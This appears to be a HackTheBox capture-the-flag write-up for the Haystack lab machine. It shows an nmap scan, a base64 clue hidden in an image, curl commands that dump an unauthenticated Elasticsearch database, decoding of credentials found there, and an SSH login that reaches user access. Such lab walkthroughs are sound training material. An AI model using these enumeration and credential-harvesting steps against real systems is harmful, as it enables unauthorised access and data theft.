#############################    Haystack    ####################################
##########################      By Chazapp     ##################################
This document is confidential. Please do not leak it.

We will do Haystack from HackTheBox today. It is a Linux box and its IP is
10.10.10.115. 

We start by adding the box to our /etc/hosts file

```
$ echo "10.10.10.115    haystack.htb" >> /etc/hosts
```

We use nmap with standard scripts:
```
# Nmap 7.70 scan initiated Thu Oct 31 10:12:33 2019 as: nmap -sC -sV -oA nmap/initial haystack.htb
Nmap scan report for haystack.htb (10.10.10.115)
Host is up (0.67s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 31 10:15:42 2019 -- 1 IP address (1 host up) scanned in 188.29 seconds
```

We found running nginx instances on port 80 and 9200. 80 is standard HTTP port,
9200 is standard ElasticSearch (ACID Database) port.

Port 80 serves this image, needle.jpg, showing a needle in a Haystack.
![needle](./needle.jpg)
Using `gobuster` with common and medium wordlists yields no results.
Using `exiftool` to look at the image metadata yields no results.
Using `strings` on the image file yields results: the last string available is
a base64 message:

```
$ strings needle.jpg
...
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```
Translated that into ASCII:

```
la aguja en el pajar es "clave"
```
Translated that in English:

```
the needle in the haystack is "key"
```
This cryptic message might be useful later on.

We now move on to study the ElasticSearch instance.
Using our web browser, we show all the indices (~= tables) of the database. 

```
# http://haystack.htb:9200/_cat/indices?v
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
```

We then dump the contents of the whole database using curl. We will use `jq` to
prettify the json output.

```
$ curl -X GET http://haystack.htb:9200/quotes/_search -H "Content-Type: application/json" -d '{ "query": { "match_all": {} }, "from": 0, "size": 1000 }' | jq "." >> quotes.json
$ curl -X GET http://haystack.htb:9200/bank/_search -H "Content-Type: application/json" -d '{ "query": { "match_all": {} }, "from": 0, "size": 1000 }' | jq "." >> bank.json
```

Note the .kibana index. Kibana is a software for visualization of data stored
in a running ElasticSearch instance. 

```
$ curl -x GET http://haystack.htb:9200/.kibana/_search -H "Content-Type: application/json" -d '{ "query": { "match_all": {} }, "from": 0, "size": 1000 }' | jq "."
...
{
        "_index": ".kibana",
        "_type": "doc",
        "_id": "config:6.4.2",
        "_score": 1,
        "_source": {
          "type": "config",
          "updated_at": "2019-01-23T18:15:53.396Z",
          "config": {
            "buildNum": 18010,
            "telemetry:optIn": false
          }
        }
      }
...
```
We didn't find a running Kibana on the default port (5601), we might go for
a full nmap port scan to try to find it on the box. This software would
greatly help to analyze the docs we just dumped.

Reading "quotes.json" we find a lot of spanish quotes speaking about the revolution.
Using that cryptic message we found, we try this:
```
$ cat quotes.json | grep "clave" -B 3 -A 2
        "_id": "111",
        "_score": 1,
        "_source": {
          "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
        }
      },
--
        "_id": "45",
        "_score": 1,
        "_source": {
          "quote": "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
        }
      },
```
Since the quotes are all written in spanish, it made sense to use the word
"clave" instead of "key". We decrypt both as base64:
```
$ echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d
pass: spanish.is.key
$ echo "dXNlcjogc2VjdXJpdHkg" | base64 -d
user: security
```
We try these creds on the ssh connection.
```
$ ssh security@haystack.htb
The authenticity of host 'haystack.htb (10.10.10.115)' can't be established.
ECDSA key fingerprint is SHA256:ihn2fPA4jrn1hytN0y9Z3vKpIKuL4YYe3yuESD76JeA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'haystack.htb,10.10.10.115' (ECDSA) to the list of known hosts.
security@haystack.htb's password: 
Last login: Thu Oct 31 07:35:23 2019 from 10.10.14.42
[security@haystack ~]$ whoami
security
[security@haystack ~]$ cat ~/user.txt | wc -c
33
```

We owned user. Moving on to root...
